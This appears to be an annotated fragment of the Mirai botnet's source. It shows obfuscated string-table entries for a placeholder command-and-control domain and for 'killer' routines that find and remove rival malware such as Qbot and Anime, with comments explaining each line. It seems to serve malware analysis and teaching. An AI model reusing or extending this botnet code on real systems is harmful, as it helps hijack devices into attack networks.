...
{
    add_entry(TABLE_CNC_DOMAIN, "\x52\x4B\x0F\x61\x6C\x61\x0C\x4E\x43\x4C\x22", 11); // cnc.changeme.com
    ...
    // safe string https://youtu.be/dQw4w9WgXcQ		//Youtube URL for a Rickroll (link to Never Gonna Give You Up by Rick Astley, usually sent as a practical joke)
    ...
    add_entry(TABLE_KILLER_ANIME, "\x0C\x43\x4C\x4B\x4F\x47\x22", 7);				//Anime is a competing botnet, Mirai is territorial and attempts to detect and remove any instnces of anime
    add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8);
    add_entry(TABLE_MEM_QBOT, "\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22", 13);	//Similarly Qbot, UPX, Zollard and Remaiten are other malware that Mirai scans for and removes
